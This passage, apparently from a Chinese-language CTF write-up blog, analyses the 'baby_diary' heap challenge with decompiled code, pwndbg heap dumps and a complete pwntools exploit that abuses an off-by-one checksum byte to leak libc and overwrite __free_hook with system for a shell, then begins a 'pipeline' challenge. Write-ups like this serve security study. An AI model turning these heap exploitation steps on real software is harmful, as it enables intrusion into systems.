qword_4060[i] = <span class="built_in">malloc</span>(v1 + <span class="number">1</span>);<span class="comment">// qword_4060存放地址</span></span><br><span class="line">    <span class="keyword">if</span> ( qword_4060[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      v2 = sub_132B(qword_4060[i], v1, <span class="number">10</span>);<span class="comment">// myread函数</span></span><br><span class="line">      sub_1528((<span class="keyword">unsigned</span> <span class="keyword">int</span>)i, v2);<span class="comment">// 关键函数，这里传入了写入的字符个数v2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进myread函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_132B</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">int</span>)i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)read(<span class="number">0</span>, (<span class="keyword">void</span> *)((<span class="keyword">int</span>)i + a1), <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a3 == *(_BYTE *)((<span class="keyword">int</span>)i + a1) )<span class="comment">// 换行符</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)((<span class="keyword">int</span>)i + a1) = <span class="number">0</span>;<span class="comment">// 多写一位，但是由于前面malloc的参数已经加1，所以这里没有溢出</span></span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进<code>sub_1528</code>关键函数，发现函数往输入的末位写入一位类似校验位的数据，这就造成了off by one漏洞，如果我们能够控制好输入的内容，就可以任意溢出一个字节，修改后一个chunk的size位：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_1528</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0x18</span> &amp;&amp; qword_4060[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = qword_4060[a1];</span><br><span class="line">    dword_4140[a1] = a2;<span class="comment">// dword_4140存放写入数量</span></span><br><span class="line">    <span class="keyword">if</span> ( a2 )</span><br><span class="line">      *(_BYTE *)(a2 + <span class="number">1LL</span> + v2) = (*(_BYTE *)(a2 + <span class="number">1LL</span> + v2) &amp; <span class="number">0xF0</span>) + sub_146E(a1);</span><br><span class="line">  &#125;<span class="comment">// 末位的后一位进行重新赋值，off by one</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进<code>sub_146E</code>函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_146E</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x18</span> || !qword_4060[a1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_4140[a1]; ++i )</span><br><span class="line">    v3 += *(<span class="keyword">unsigned</span> __int8 *)(i + qword_4060[a1]);<span class="comment">// 取出堆块内容中的每一个int8</span></span><br><span class="line">  <span class="keyword">while</span> ( v3 &gt; <span class="number">0xF</span> )<span class="comment">// 如果v3大于0xf</span></span><br><span class="line">    v3 = (v3 &gt;&gt; <span class="number">4</span>) + (v3 &amp; <span class="number">0xF</span>);<span class="comment">// 求出除以16的商和余数，求和</span></span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>show函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_17A8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v1 = sub_13C3();</span><br><span class="line">  result = sub_15DF(v1) ^ <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;content: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)qword_4060[v1]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进<code>sub_15DF</code>检测函数，该函数检测<code>v2</code>与计算出来的位之和共奇偶，就可以打印：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_15DF</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">24</span> || !qword_4060[a1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v3 = dword_4140[a1];<span class="comment">// 注意新建堆时必须要填入内容，否则检测函数会判断错误，并返回0</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v2 = *(_BYTE *)(v3 + <span class="number">1LL</span> + qword_4060[a1]);</span><br><span class="line">  <span class="keyword">return</span> ((v2 - (<span class="keyword">unsigned</span> __int8)sub_146E(a1)) &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>free函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1814</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  LODWORD(v0) = sub_13C3();</span><br><span class="line">  v2 = (<span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v0 &lt;= <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (_DWORD *)qword_4060[(<span class="keyword">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_4060[v2]);</span><br><span class="line">      qword_4060[v2] = <span class="number">0LL</span>;</span><br><span class="line">      v0 = dword_4140;</span><br><span class="line">      dword_4140[v2] = <span class="number">0</span>;<span class="comment">// 并未清空堆空间内容</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>思路，存在off by one漏洞时，我们可以使用unlink函数进行攻击，下面看看如何绕过：</li></ul><h4 id="构造释放堆块前一个chunk的header"><a href="#构造释放堆块前一个chunk的header" class="headerlink" title="构造释放堆块前一个chunk的header"></a>构造释放堆块前一个chunk的header</h4><ul><li><p>首先通过large bin残存的<code>fd_nextsize</code>和<code>bk_nextsize</code>来构造unlink的<code>fd</code>和<code>bk</code>指针。</p><ul><li>申请一个large bin大小的chunk，首先释放成为unsorted bin，然后申请一个更大的chunk，这样unsorted bin就会进入large bin中，这时他的<code>fd_nextsize</code>和<code>bk_nextsize</code>指针指向的都是自己。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 释放后成为unsorted bin</span><br><span class="line">pwndbg&gt; x/20gx 0x56171f2c93e0</span><br><span class="line">0x56171f2ca010:0x00000000000000000x00000000000013d1</span><br><span class="line">0x56171f2ca020: 0x00007fcb749bdbe00x00007fcb749bdbe0</span><br><span class="line">0x56171f2ca030:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"># 申请更大的chunk后，或者申请分割的chunk，堆块会先进入large bin，写入fd_nextsize和bk_nextsize两个指针，并同时指向堆块头部。</span><br><span class="line"># 进入large bin后被分割，仍会回到unsorted bin</span><br><span class="line">pwndbg&gt; x/20gx 0x56171f2ca010</span><br><span class="line">0x56171f2ca010:0x00000000000000000x0000000000000031</span><br><span class="line">0x56171f2ca020:0x00000000000000070x0000000000000101</span><br><span class="line">0x56171f2ca030:0x000056171f2200080x000056171f2ca010</span><br><span class="line">0x56171f2ca040:0x00000000000000000x00000000000013b1</span><br><span class="line">0x56171f2ca050:0x00007fcb749bdbe00x00007fcb749bdbe0</span><br></pre></td></tr></table></figure><ul><li>这时候修改<code>fd</code>指针为<code>fd-8</code>，不修改<code>bk</code>指针，这样<code>FD -&gt; bk</code>和<code>BK -&gt; fd</code>同时指向了<code>0x56171f2ca020</code>，并且需要在该地址存储自己的地址<code>0x56171f2ca020</code>，从而绕过unlink的检测。</li><li>这里要注意写入操作中会将地址的倒数第2个字节覆盖为<code>\x00</code>，所以我们要保证上述的几个地址，包括<code>0x56171f2ca020 - 0x18</code>的倒数第2个字节的低位仍然为<code>\x0</code>。</li></ul></li><li><p>如何构造上述地址呢？我们构造两个fast bin，接连将其释放，这样<code>0x56171f2ca020</code>位置就会写入fd的指针，即前一个fast bin的地址，通过修改fast bin的指针来达成目的。</p><ul><li>由于地址末位为<code>0x20</code>，所以只需要写入<code>p8(0x20)</code>即可，但是根据写入的规则，程序会将地址倒数第2个字节覆盖为<code>\x00</code>，倒数第3个字节的低位覆盖为checksum校验位<code>\x2</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x56171f2ca010</span><br><span class="line">0x56171f2ca010:0x00000000000000000x0000000000000031</span><br><span class="line">0x56171f2ca020:0x000056171f2200200x0000000000000101</span><br><span class="line">0x56171f2ca030:0x000056171f2200080x000056171f2ca010</span><br></pre></td></tr></table></figure><ul><li>由于上面写入<code>fd</code>的时候也会在倒数第二位覆盖为<code>\x00</code>，倒数第3个字节的低位覆盖为checksum校验位，那么我们需要保证两个写入checksum的是相同的（这里都为<code>\x2</code>）。这里通过修改上面的payload中<code>add(0x20, p64(0x7) + p64(0x101) + p8(0x08)) # 9</code>的无用数据<code>p64(0x7)</code>进行调整。</li><li>实际上除了倒数3位是相同的外，其余参数由于系统开启了PIE都是随机的，所以0x000056171f2<strong>20</strong>020加粗的部分是需要爆破的，有1/256的可能性可以命中。</li></ul></li></ul><h4 id="构造释放堆块的prev-size和prev-inuse位"><a href="#构造释放堆块的prev-size和prev-inuse位" class="headerlink" title="构造释放堆块的prev size和prev inuse位"></a>构造释放堆块的prev size和prev inuse位</h4><ol><li>首先通过内容全部写<code>\x00</code>，将<code>prev_inuse</code>位覆盖为<code>\x0</code>。</li><li>然后使用<code>add(0x17, p64(0) + p64(1)) # 12</code>将<code>prev_size</code>位覆盖为<code>0x100</code>，还是比较巧妙的。但导致<code>prev_size</code>只能写入0x100的倍数，所以我们前面的fackchunk的<code>size</code>位也要写成<code>0x101</code>。</li><li>注意要保证free这个chunk的时候会触发<code>malloc_consolidate</code>函数，所以要确保chunk大小在tcache范围之外，这里选择了<code>0x500</code>。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x55932b25c120</span><br><span class="line">0x55932b25c120:0x00000000000001000x0000000000000510</span><br><span class="line">0x55932b25c130:0x00007f2d9b8700610x00007f2d9b8a1210</span><br><span class="line">0x55932b25c140:0x000055932b25c1200x000055932b25c120</span><br></pre></td></tr></table></figure><h4 id="构造释放堆块下个chunk的prev-inuse位"><a href="#构造释放堆块下个chunk的prev-inuse位" class="headerlink" title="构造释放堆块下个chunk的prev_inuse位"></a>构造释放堆块下个chunk的prev_inuse位</h4><ul><li><p>这里很简单，只需要申请一个chunk即可，为了后面的堆块重叠，我们选择将后面的free chunk全部申请掉。</p></li><li><p>脚本：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(endian = <span class="string">&#x27;little&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">   cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   init-pwndbg</span></span><br><span class="line"><span class="string">   b malloc</span></span><br><span class="line"><span class="string">   b free</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   gdb.attach(sh, cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">cho</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(cho))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content = <span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">   choice(<span class="number">1</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;content: &#x27;</span>, content)</span><br><span class="line">   v3 = <span class="number">0</span></span><br><span class="line">   <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   for char in content:</span></span><br><span class="line"><span class="string">      v3 += ord(char)</span></span><br><span class="line"><span class="string">      while v3 &gt; 0xf:</span></span><br><span class="line"><span class="string">         v3 = (v3 / 0x10) + (v3 % 0x10)</span></span><br><span class="line"><span class="string">   print(content, hex(v3)</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">   choice(<span class="number">2</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">   choice(<span class="number">3</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">   [add(<span class="number">0x20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)] <span class="comment"># 0-6</span></span><br><span class="line">   add(<span class="number">0x2000</span>) <span class="comment"># 7</span></span><br><span class="line">   add(<span class="number">0x10</span>) <span class="comment"># 8</span></span><br><span class="line">   free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">   add(<span class="number">0x1000</span> - <span class="number">0x3f0</span> + <span class="number">0x10</span>) <span class="comment"># 7</span></span><br><span class="line">   add(<span class="number">0x20</span>, p64(<span class="number">0x7</span>) + p64(<span class="number">0x101</span>) + p8(<span class="number">0x08</span>)) <span class="comment"># 9</span></span><br><span class="line">   add(<span class="number">0x20</span>) <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">   [free(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">   free(<span class="number">10</span>)</span><br><span class="line">   free(<span class="number">9</span>)</span><br><span class="line">   [add(<span class="number">0x20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)] <span class="comment"># 0-6</span></span><br><span class="line">   add(<span class="number">0x20</span>, p8(<span class="number">0x20</span>)) <span class="comment"># 9</span></span><br><span class="line">   add(<span class="number">0x100</span> - <span class="number">0x30</span> * <span class="number">2</span> - <span class="number">0x20</span>) <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">   add(<span class="number">0x17</span>) <span class="comment"># 11</span></span><br><span class="line">   free(<span class="number">11</span>)</span><br><span class="line">   add(<span class="number">0x500</span>) <span class="comment"># 11</span></span><br><span class="line">   add(<span class="number">0x17</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p32(<span class="number">0</span>) + p8(<span class="number">0</span>) * <span class="number">3</span>) <span class="comment"># 12</span></span><br><span class="line">   free(<span class="number">12</span>)</span><br><span class="line">   add(<span class="number">0x17</span>, p64(<span class="number">0</span>) + p64(<span class="number">1</span>)) <span class="comment"># 12</span></span><br><span class="line">   add(<span class="number">0xdb0</span>) <span class="comment"># 13</span></span><br><span class="line">   free(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">   add(<span class="number">0x40</span>)  <span class="comment"># 11</span></span><br><span class="line">   show(<span class="number">10</span>)</span><br><span class="line">   sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">   libc.address = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>, timeout = <span class="number">0.5</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span> - <span class="number">0x1ebb80</span></span><br><span class="line">   <span class="keyword">assert</span> libc.address &amp; <span class="number">0xfff</span> == <span class="number">0</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">   add(<span class="number">0x10</span>) <span class="comment"># 14</span></span><br><span class="line">   free(<span class="number">14</span>)</span><br><span class="line">   free(<span class="number">12</span>)</span><br><span class="line">   add(<span class="number">0x100</span>, flat(&#123;<span class="number">0x68</span>: <span class="number">0x21</span>, <span class="number">0x70</span>: libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>&#125;, filler = <span class="string">&#x27;\x00&#x27;</span>)) <span class="comment"># 12</span></span><br><span class="line">   add(<span class="number">0x10</span>) <span class="comment"># 14</span></span><br><span class="line"></span><br><span class="line">   add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])) <span class="comment"># 15</span></span><br><span class="line">   free(<span class="number">15</span>)</span><br><span class="line">   sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   sh = process(<span class="string">&quot;./baby_diary&quot;</span>)</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">      pwn()</span><br><span class="line">   <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">      sh.close()</span><br></pre></td></tr></table></figure><h3 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h3><ul><li>使用IDA反编译程序：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(__int64, <span class="keyword">char</span> **, <span class="keyword">char</span> **))((<span class="keyword">char</span> *)&amp;sub_1288 + <span class="number">1</span>))(a1, a2, a3);</span><br><span class="line">  sub_1921();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_1921</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_14E1();</span><br><span class="line">    v0 = sub_1540(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong choice&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  __asm &#123; jmp     rax &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>后面的汇编代码IDA似乎解析得不全，我们来解析一下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000194C                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:000000000000194F                 lea     rdx, ds:0[rax*4] # rdx = 4 * rax</span><br><span class="line">.text:0000000000001957                 lea     rax, byte_20BC # 0xfffff8b4fffff8fa</span><br><span class="line">.text:000000000000195E                 mov     eax, [rdx+rax] # 0xfffff8fa</span><br><span class="line">.text:0000000000001961                 cdqe# 0xfffffffffffff8b4</span><br><span class="line">.text:0000000000001963                 lea     rdx, byte_20BC # rdx = $rebase(0x020BC)</span><br><span class="line">.text:000000000000196A                 add     rax, rdx # rax = $rebase(0x020BC - 0x74C) = $rebase(0x1970)</span><br><span class="line">.text:000000000000196D                 db      3Eh</span><br><span class="line">.text:000000000000196D                 jmp     rax</span><br></pre></td></tr></table></figure><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110071051051.png" alt="image-20211007105004092" style="zoom:50%;" /></p><ul><li>原理分析下来，<code>byte_20BC</code>数组类似于函数地址表，最后取得的rax为<code>$rebase(0x1970)</code>后的函数：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110071054151.png" alt="image-20211007105436173" style="zoom:50%;" /></p><ul><li>add函数，发现<code>malloc</code>的结构体是一个链式结构：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 